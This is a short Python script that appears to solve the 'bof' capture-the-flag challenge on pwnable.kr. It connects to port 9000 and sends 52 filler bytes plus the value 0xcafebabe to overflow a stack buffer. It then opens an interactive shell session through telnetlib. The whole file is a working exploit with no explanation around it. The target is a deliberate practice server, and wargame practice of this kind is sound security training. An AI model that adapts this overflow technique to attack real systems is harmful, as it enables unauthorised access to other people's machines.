#! /usr/bin/python

import sys
import struct
import socket
import telnetlib

if sys.byteorder == 'little':
	Q = lambda x: struct.pack("<I", x)
elif sys.byteorder == 'big':
	Q = lambda x: struct.pack(">I", x)

try:
	s = socket.create_connection(("pwnable.kr", 9000))
except socket.gaierror as e:
	(n, q) = e

	sys.exit(-1)

try:
	s.send("\x41"*(52) + Q(0xcafebabe) + chr(0x0a))
except socket.error as e:
	(n, q) = e

	sys.exit(-1)

t = telnetlib.Telnet()
t.sock = s
t.interact()
